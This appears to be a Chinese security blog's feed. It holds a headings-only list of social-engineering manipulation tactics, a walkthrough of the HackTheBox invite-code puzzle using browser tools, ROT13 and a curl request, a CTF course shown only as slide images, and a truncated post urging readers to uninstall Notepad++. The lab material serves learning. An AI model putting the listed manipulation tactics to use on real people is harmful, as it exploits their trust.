社工黑客的战术清单</h2><ol><li>感觉漏洞的挖掘和利用</li><li>知觉漏洞的挖掘和利用</li><li>记忆博弈</li><li>情结博弈</li><li>注意控制</li><li>动机诱惑</li><li>微表情泄密</li><li>肢体语言泄密</li><li>姿势泄密</li><li>喜欢的引发和利用</li><li>利他与易控行为的利用</li><li>态度的控制</li><li>人际关系的利用和控制</li></ol><h1 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03  总结"></a>0x03  总结</h1><p>个人感觉内容挺充实的，大家有兴趣的可以在去看看他的那本书。本人还没看过，不过有点子版本的，有需要的可以在下方留下联系方式。</p><p><img alt="img" data-src="https://i03piccdn.sogoucdn.com/c33229afd072e890" class="lozad"></p><p>### </p><hr>]]></content>
      
      
      <categories>
          
          <category> 社会工程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 社工 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hackthebox初探之获取邀请码</title>
      <link href="/2019/11/11/hackthebox%E5%88%9D%E6%8E%A2%E4%B9%8B%E8%8E%B7%E5%8F%96%E9%82%80%E8%AF%B7%E7%A0%81/"/>
      <url>/2019/11/11/hackthebox%E5%88%9D%E6%8E%A2%E4%B9%8B%E8%8E%B7%E5%8F%96%E9%82%80%E8%AF%B7%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>今日，一同事和我提到hackthebox，通过搜索得知hackthebox是国外的一个CTF在线靶场平台，靶机数量很大，有免费和花钱的（这是一个为知识付费的时代，好东西都是要花钱的）。不过在注册的时候就设置了一个门槛，需要获取邀请码才能注册，而这个邀请码和国内的一些平台不太一样，需要自己去寻找，今天给大家分享的就是如何如找到邀请码。</p><a id="more"></a><h1 id="0x01-走捷径"><a href="#0x01-走捷径" class="headerlink" title="0x01 走捷径"></a>0x01 走捷径</h1><p>因为网上已经有很多人介绍了获取邀请码的教程，大家如果不想知道原理的话，可以走捷径直接获取注册。</p><p>在kali或者其他Linux系统中使用curl命令直接获取</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl https://www.hackthebox.eu/api/invite/generate -X POST</span><br></pre></td></tr></table></figure><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191111175831.png" class="lozad"></p><p>code中的数据值就是我们需要的邀请码，不过是base64加密的，解密一下就好了。</p><h1 id="0x02-自己摸索思路"><a href="#0x02-自己摸索思路" class="headerlink" title="0x02 自己摸索思路"></a>0x02 自己摸索思路</h1><p>首先访问hackthebox官网：<a href="https://www.hackthebox.eu/" target="_blank" rel="noopener">https://www.hackthebox.eu/</a></p><p>查看源代码，按Ctrl + F 搜索invite，发现有个inviteapi.min.js文件，点击访问</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191111181018.png" class="lozad"></p><p>再次搜索invite可以定位到有makeInviteCode这个方法。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191111181027.png" class="lozad"></p><p>在输入邀请码的地方按f12，在控制台输入makeInviteCode（）回车</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191111181102.png" class="lozad"></p><p>发现是一个rot13加密的数据，复制数据扔到<a href="https://rot13.com/网站中去解密" target="_blank" rel="noopener">https://rot13.com/网站中去解密</a></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191111181116.png" class="lozad"></p><p>从解密结果可以看出，需要提交一个post请求到<code>www.hackthebox.eu/api/invite/generate</code>这个url到这里就有很多思路了，这里提供两个思路给大家，第一个是使用burpsuite抓包然后修改请求的链接和请求方法，第二个是直接使用curl命令去请求。</p><p>【方法一:使用burpsuite】</p><p>先在hackthebox网站上抓一个包，然后发送到repeater模块，修改链接和请求方法，在go一下即可看到回显的邀请码</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191111181146.png" class="lozad"></p><p>发送到decoder模块解码</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191111181212.png" class="lozad"></p><p>后者右击直接解码</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191111181222.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191111181237.png" class="lozad"></p><p>【方法二:还是用curl命令】</p><blockquote><p>curl<br><a href="https://www.hackthebox.eu/api/invite/generate" target="_blank" rel="noopener">https://www.hackthebox.eu/api/invite/generate</a><br>-X POST</p></blockquote><h1 id="0x03-其他教程链接"><a href="#0x03-其他教程链接" class="headerlink" title="0x03 其他教程链接"></a>0x03 其他教程链接</h1><p><a href="https://blog.csdn.net/u010953692/article/details/82024150" target="_blank" rel="noopener">https://blog.csdn.net/u010953692/article/details/82024150</a></p><p><a href="https://www.bus123.net/10123.html" target="_blank" rel="noopener">https://www.bus123.net/10123.html</a></p><hr>]]></content>
      
      
      <categories>
          
          <category> CTF相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hackthebox </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF夺旗训练视频课程PPT</title>
      <link href="/2019/11/05/CTF%E5%A4%BA%E6%97%97%E8%AE%AD%E7%BB%83%E8%A7%86%E9%A2%91%E8%AF%BE%E7%A8%8BPPT/"/>
      <url>/2019/11/05/CTF%E5%A4%BA%E6%97%97%E8%AE%AD%E7%BB%83%E8%A7%86%E9%A2%91%E8%AF%BE%E7%A8%8BPPT/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-CTF训练-课程介绍"><a href="#0x00-CTF训练-课程介绍" class="headerlink" title="0x00 CTF训练-课程介绍"></a>0x00 CTF训练-课程介绍</h1><p>前些日子因为参加CTF比赛，朋友发了我一些CTF的资料，今天整理资料的过程中发现还有这个一系列课程的PPT，为了方便学习查看，将PPT汇总成文档吧。</p><a id="more"></a><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105093602.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105093633.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105093649.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105093700.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105093712.png" class="lozad"></p><h1 id="0x01-CTF训练-环境搭建"><a href="#0x01-CTF训练-环境搭建" class="headerlink" title="0x01 CTF训练-环境搭建"></a>0x01 CTF训练-环境搭建</h1><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105093756.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105093807.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105093822.png" class="lozad"></p><h1 id="0x02-靶场夺旗"><a href="#0x02-靶场夺旗" class="headerlink" title="0x02 靶场夺旗"></a>0x02 靶场夺旗</h1><h1 id="0x03-CTF训练-POST注入-HTTP报文注入"><a href="#0x03-CTF训练-POST注入-HTTP报文注入" class="headerlink" title="0x03 CTF训练-POST注入-HTTP报文注入"></a>0x03 CTF训练-POST注入-HTTP报文注入</h1><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105094457.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105094516.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105094525.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105094534.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105094543.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105094553.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105094602.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105094619.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105094627.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105094635.png" class="lozad"></p><h1 id="0x04-CTF训练-PUT漏洞"><a href="#0x04-CTF训练-PUT漏洞" class="headerlink" title="0x04 CTF训练-PUT漏洞"></a>0x04 CTF训练-PUT漏洞</h1><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105094710.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105094720.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105094734.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105094750.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105094757.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105094810.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105094818.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105094827.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105094837.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105094844.png" class="lozad"></p><h1 id="0x05-CTF训练-SQL注入GET参数"><a href="#0x05-CTF训练-SQL注入GET参数" class="headerlink" title="0x05 CTF训练-SQL注入GET参数"></a>0x05 CTF训练-SQL注入GET参数</h1><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105094906.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105094916.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105094929.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105094941.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105094953.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105095007.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105095016.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105095027.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105095033.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105095041.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105095055.png" class="lozad"></p><h1 id="0x06-CTF训练-SSH服务渗透"><a href="#0x06-CTF训练-SSH服务渗透" class="headerlink" title="0x06 CTF训练-SSH服务渗透"></a>0x06 CTF训练-SSH服务渗透</h1><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105095115.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105095135.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105095144.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105095152.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105095200.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105095208.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105095214.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105095221.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105095228.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105095234.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105095240.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105095247.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105095253.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105095258.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105095305.png" class="lozad"></p><h1 id="0x07-CTF训练-SSH私钥泄露"><a href="#0x07-CTF训练-SSH私钥泄露" class="headerlink" title="0x07 CTF训练-SSH私钥泄露"></a>0x07 CTF训练-SSH私钥泄露</h1><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105095357.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105095410.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105095416.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105095424.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105095432.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105095440.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105095448.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105095457.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105095502.png" class="lozad"></p><h1 id="0x08-CTF训练-SSI注入"><a href="#0x08-CTF训练-SSI注入" class="headerlink" title="0x08 CTF训练-SSI注入"></a>0x08 CTF训练-SSI注入</h1><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105095521.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105095534.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105095542.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105095547.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105095608.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105095617.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105095625.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105095632.png" class="lozad"></p><h1 id="0x09-CTF训练-FTP服务安全"><a href="#0x09-CTF训练-FTP服务安全" class="headerlink" title="0x09 CTF训练-FTP服务安全"></a>0x09 CTF训练-FTP服务安全</h1><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105093855.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105093906.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105093916.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105094354.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105094405.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105094416.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105094428.png" class="lozad"></p><h1 id="0x10-CTF训练-暴力破解"><a href="#0x10-CTF训练-暴力破解" class="headerlink" title="0x10 CTF训练-暴力破解"></a>0x10 CTF训练-暴力破解</h1><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105095928.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105095935.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105095943.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105095949.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105095955.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100001.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100007.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100012.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100018.png" class="lozad"></p><h1 id="0x11-CTF-SMB信息泄露"><a href="#0x11-CTF-SMB信息泄露" class="headerlink" title="0x11 CTF-SMB信息泄露"></a>0x11 CTF-SMB信息泄露</h1><h1 id="0x12-CTF训练-路径遍历-提权"><a href="#0x12-CTF训练-路径遍历-提权" class="headerlink" title="0x12 CTF训练-路径遍历 - 提权"></a>0x12 CTF训练-路径遍历 - 提权</h1><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100047.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100056.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100104.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100112.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100122.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100128.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100133.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100139.png" class="lozad"></p><h1 id="0x13-CTF训练-路径遍历（www-data）"><a href="#0x13-CTF训练-路径遍历（www-data）" class="headerlink" title="0x13 CTF训练-路径遍历（www-data）"></a>0x13 CTF训练-路径遍历（www-data）</h1><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100152.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100203.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100213.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100221.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100227.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100234.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100240.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100246.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100255.png" class="lozad"></p><h1 id="0x14-CTF训练-命令执行"><a href="#0x14-CTF训练-命令执行" class="headerlink" title="0x14 CTF训练-命令执行"></a>0x14 CTF训练-命令执行</h1><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100344.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100354.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100400.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100407.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100413.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100420.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100425.png" class="lozad"></p><h1 id="0x15-CTF训练-命令注入（集成工具）"><a href="#0x15-CTF训练-命令注入（集成工具）" class="headerlink" title="0x15 CTF训练-命令注入（集成工具）"></a>0x15 CTF训练-命令注入（集成工具）</h1><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100440.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100449.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100457.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100503.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100511.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100520.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100527.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100533.png" class="lozad"></p><h1 id="0x16-CTF训练-命令注入综合"><a href="#0x16-CTF训练-命令注入综合" class="headerlink" title="0x16  CTF训练-命令注入综合"></a>0x16  CTF训练-命令注入综合</h1><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100556.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100604.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100609.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100614.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100638.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100644.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100648.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100654.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100702.png" class="lozad"></p><h1 id="0x17-CTF训练-注入X-Forwarded-For头"><a href="#0x17-CTF训练-注入X-Forwarded-For头" class="headerlink" title="0x17 CTF训练-注入X-Forwarded-For头"></a>0x17 CTF训练-注入X-Forwarded-For头</h1><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100716.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100727.png" class="lozad"><br><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100736.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100743.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100749.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100756.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100804.png" class="lozad"></p><h1 id="0x18-SMB信息泄露"><a href="#0x18-SMB信息泄露" class="headerlink" title="0x18 SMB信息泄露"></a>0x18 SMB信息泄露</h1><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100859.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100907.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100913.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100928.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100934.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100940.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100947.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100954.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105101001.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105101007.png" class="lozad"></p><h1 id="0x19-CTF训练-综合测试初学者"><a href="#0x19-CTF训练-综合测试初学者" class="headerlink" title="0x19 CTF训练-综合测试初学者"></a>0x19 CTF训练-综合测试初学者</h1><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105101023.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105101037.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105101323.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105101331.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105101338.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105101400.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105101406.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105101414.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105101419.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105101426.png" class="lozad"></p><h1 id="0x19-综合渗透实际渗透"><a href="#0x19-综合渗透实际渗透" class="headerlink" title="0x19 综合渗透实际渗透"></a>0x19 综合渗透实际渗透</h1><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105101445.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105101459.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105101506.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105101513.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105101519.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105101524.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105101534.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105101541.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105101547.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105101553.png" class="lozad"></p><h1 id="0x20-结束"><a href="#0x20-结束" class="headerlink" title="0x20 结束"></a>0x20 结束</h1><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105102421.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105102431.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105102442.png" class="lozad"></p><hr>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>手起刀落Notepad++</title>
      <link href="/2019/10/31/%E6%89%8B%E8%B5%B7%E5%88%80%E8%90%BDNotepad/"/>
      <url>/2019/10/31/%E6%89%8B%E8%B5%B7%E5%88%80%E8%90%BDNotepad/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>听说，有人想搞事？搞台独？</p><p><img alt="img" data-src="https://i04piccdn.sogoucdn.com/2c1eb568c5477e50" class="lozad"></p><a id="more"></a><h1 id="0x01-正文"><a href="#0x01-正文" class="headerlink" title="0x01 正文"></a>0x01 正文</h1><p>今日，听到消息称notepad++作者公然支持台独，作为我们大中国的一个底层小市民，为了保卫祖国统一不受侵犯，必须要站出来做点什么了。</p><p>手起刀落，卸载~</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191031093355.png" class="lozad"></p><p>访问网站？</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191031093441.png" class="lozad"></p><p>怕卸载notepad++没有好用的编辑器？</p><h1 id="0x02-编辑器推荐"><a href="#0x02-编辑器推荐" class="headerlink" title="0x02 编辑器推荐"></a>0x02 编辑器推荐</h1><h2 id="2-1-sublime"><a href="#2-1-sublime" class="headerlink" title="2.1 sublime"></a>2.1 